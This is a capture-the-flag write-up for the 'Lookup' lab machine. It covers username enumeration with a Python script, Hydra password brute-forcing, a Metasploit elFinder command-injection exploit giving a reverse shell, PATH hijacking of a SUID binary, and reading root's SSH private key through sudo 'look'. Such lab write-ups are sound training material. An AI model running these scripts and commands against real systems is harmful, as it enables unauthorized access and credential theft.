### Intro
_Lookup_ features real-world vulnerabilities like web app flaws and privilege escalation. It teaches key skills such as reconnaissance, enumeration, command injection, and scripting for automation—offering valuable experience in penetration testing and secure coding practices.
### Enumeration
#### Nmap
```bash
nmap -p- -A 10.10.248.120
Starting Nmap 7.80 ( https://nmap.org ) at 2025-07-14 22:49 BST
Nmap scan report for ip-10-10-248-120.eu-west-1.compute.internal (10.10.248.120)
Host is up (0.00021s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://lookup.thm
MAC Address: 02:55:1A:4A:B6:E7 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=7/14%OT=22%CT=1%CU=41006%PV=Y%DS=1%DC=D%G=Y%M=02551A%T
OS:M=68757B71%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10A%TI=Z%CI=Z%II=I
OS:%TS=A)OPS(O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11N
OS:W7%O5=M2301ST11NW7%O6=M2301ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F
OS:4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T
OS:=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R
OS:%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=
OS:40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0
OS:%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R
OS:=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.21 ms ip-10-10-248-120.eu-west-1.compute.internal (10.10.248.120)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.87 seconds
```

Browsing the IP gives us `We can’t connect to the server at lookup.thm.`, meaning the computer tried to reach the address `http://lookup.thm` but couldn't find or connect to the server. To overcome this issue we need to map the `ip` to `hostname` in `/etc/hosts (a local file where you manually map hostnames to IP addresses)` file because the internal lab domains aren't publicly registered. 

#### Browse the hostname
```bash
lookup.thm
```
- We get a basic login page.

When we try to input some random creds, we get an error message saying `Wrong username or password. Please try again. Redirecting in 3 seconds.` However, when we try default creds like `admin:admin`, we only get `Wrong password. Please try again. Redirecting in 3 seconds.` We can also see that the `HTTP Method: POST` and `Subdirectory: login.php` pop up for a few seconds. We can confirm this by nmap scan.

#### Nmap to Discover the Login Page
```bash
nmap -p80 --script http-enum <IP>
```

Now that we have managed to find the login page, we can try to `brute-force` this page. Before finding passwords we need to find users in the website. One of the users is `admin`, we can confirm that from earlier error message. We can use a Python script to find users.
#### Python Script to Enumerate Users
```python
import requests
from concurrent.futures import ThreadPoolExecutor
import threading
from urllib.parse import urljoin

print_lock = threading.Lock()

def is_valid_user(response):
    invalid_msg = "Wrong username or password. Please try again.<br>Redirecting in 3 seconds."
    return not (response.text.strip() == invalid_msg and len(response.text.strip()) == 74)

def check_username(session, post_url, username_field, password_field, fake_password, username):
    data = {username_field: username, password_field: fake_password}
    try:
        response = session.post(post_url, data=data, timeout=10)
        if is_valid_user(response):
            with print_lock:
                print(f"[+] Valid username: {username}")
    except requests.RequestException:
        pass  # silently ignore errors

def main():
    print("=== User Enumeration (Only Valid Users Output) ===\n")
    base_url = input("Base URL (e.g. http://lookup.thm/): ").strip()
    post_path = input("Login form action path (e.g. login.php): ").strip()
    post_url = urljoin(base_url, post_path)
    username_field = input("Username field name (e.g. username): ").strip()  # The username and password fields can be extracted from 
    password_field = input("Password field name (e.g. password): ").strip()  # the source page under username and password snippets.
    fake_password = input("Fake password to use (e.g. Invalid123!): ").strip()
    wordlist_path = input("Path to username wordlist: ").strip()
    threads = input("Number of threads to use (default 10): ").strip()
    threads = int(threads) if threads else 10

    session = requests.Session()
    try:
        with open(wordlist_path, "r") as f:
            usernames = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("[!] Wordlist file not found.")
        return

    print(f"\n[*] Starting scan with {threads} threads...\n")

    with ThreadPoolExecutor(max_workers=threads) as executor:
        for username in usernames:
            executor.submit(check_username, session, post_url, username_field, password_field, fake_password, username)

if __name__ == "__main__":
    main()
```

We have managed to extract two usernames `admin` and `jose`. Now, it's time to brute-force the password for these users.
![[Python_Script.png]]

#### Brute Force with Hydra
```bash
hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form '/login.php:username=jose&password=^PASS^:F=Wrong' -t 32
```

We've managed to crack the password of the user `jose` and the password is `password123`.
![[Hydra_Password_Brute_Force.png]]
We now use these credentials to login in but like earlier we get nothing. When we inspect the `Network` tab and login with the creds again, we get a new subdomain `files.lookup.thm`. 

This technique is called `Virtual Hosting`, where multiple domain names are hosted on the same IP. The web server uses the `Host header in the HTTP request` to determine which site to server.

We can map this subdomain to the IP like we did earlier.

#### Map the Subdomain
```bash
sudo vim /etc/hosts
IP     files.lookup.thm
```

Once that is done, refresh the page and we are inside the website. There are a lot of files and we can check all of them. However, the files do no contain anything special. So, we check the software and it's version. We can see that it is `elFinder` and it is using the version `2.1.47`. With this information, we can search for it.![[Vulnerable_Software.png]]

#### Search for the Vulnerability
```bash
searchsploit elfinder 2.1.47
```

We can see there are a few vulnerabilities showed up.
![[Searchsploit.png]]

### Initial Access
#### Msfconsole
```bash
search elfinder type:exploit
use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection 
set rhosts files.lookup.thm
set lhosts <IP>
run
```

![[msfconsole.png]]

Using the vulnerability, we have managed to get a reverse meterpreter shell. Now, it's time for privilege escalation.

### Privilege Escalation
#### Shell Stabilization
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

We checked if we're in the sudoers list but we aren't. Next, I checked the SUID permissions.

#### Search for SUID permissions
```bash
find / -perm -4000 2>/dev/null
```
- `/usr/bin/at` and `/usr/sbin/pwm` looked interesting but the `/usr/bin/at` didn't work. Now, it's time to dig into `/usr/sbin/pwm` in depth.

We ran the binary and got the following output where it is running the `id` binary and looking for the `.password` file under the user home.
![[User_priv_esc.png]]

#### Go inside the Home folder to Find Users
```bash
cd /home
```

There are 3 different users. I checked inside those users for the `.password` file.

```bash
ls -al think
```

The user `think` has the `.password` file that could contain the password of the user.
![[password_file.png]]

Now, we need to escalate our privileges to the `think` user to read that file. Since, the `/usr/sbin/pwm` is executing the `id` binary we can use this to escalate our privileges.

#### Create a fake ID binary under /tmp folder and give Executable permissions
```bash
echo -e '#!/bin/bash\necho "uid=33(think) gid=33(www-data) groups=33(www-data)"' > id && chmod +x id
```

Once the fake binary is created, we need to export the `/tmp` folder at the beginning so that our fake `id` runs instead of the real one.
```bash
export PATH=/tmp:$PATH
echo $PATH
```

Now, it's time to run the `/usr/sbin/pwm` binary and once we do that we can see the password list. Save the list to your local machine to brute-force the password.

#### Brute-Force the password list
```bash
hydra -l think -P pass-list ssh://lookup.thm -t 32                                                                                  
```
![[password-Brute_Force.png]]
Once we successfully crack the password for the `think` user, it's time to ssh into the machine.

#### SSH
```bash
ssh think@lookup.thm
```

We can now read the `user.txt` flag.

Now, it's time to escalate our privileges to root. 
```bash
sudo -l
```

We find the following binary that is run as root. However, it doesn't have SUID permissions. This binary seems to read files, follow GTFOBins for more.
![[look.png]]

#### Read Files with Look
**To just read the `root.txt`**
```bash
sudo look '' /root/root.txt
```

**Read the `/root/.ssh/id_rsa` private key
```bash
sudo look '' /root/.ssh/id_rsa
```

Save the file in your local machine and and changed the permissions.
```bash
chmod 600 id_rsa
```

#### ssh using that key
```bash
ssh -i id_rsa root@lookup.thm
```